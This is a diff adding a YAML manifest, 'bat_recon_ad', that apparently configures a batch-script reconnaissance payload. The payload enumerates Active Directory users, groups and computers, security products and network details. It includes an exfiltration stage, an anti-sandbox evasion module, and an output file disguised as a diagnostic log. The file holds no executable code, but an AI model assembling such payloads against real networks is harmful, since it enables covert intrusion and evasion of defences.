@@ -1,0 +1,23 @@
+name: bat_recon_ad
+description: Batch AD recon with domain user/group/computer enumeration
+format: batch
+
+core:
+  - core/output
+
+collectors:
+  - collectors/sysinfo
+  - collectors/network
+  - collectors/security_products
+  - ad_collectors/ad_users
+  - ad_collectors/ad_groups
+  - ad_collectors/ad_computers
+
+exfil: exfil/file_drop
+arch: arch/sequential
+
+evasion:
+  - evasion/anti_sandbox
+
+vars:
+  OUTPUT_FILE: "%TEMP%\\diag_%RANDOM%.log"
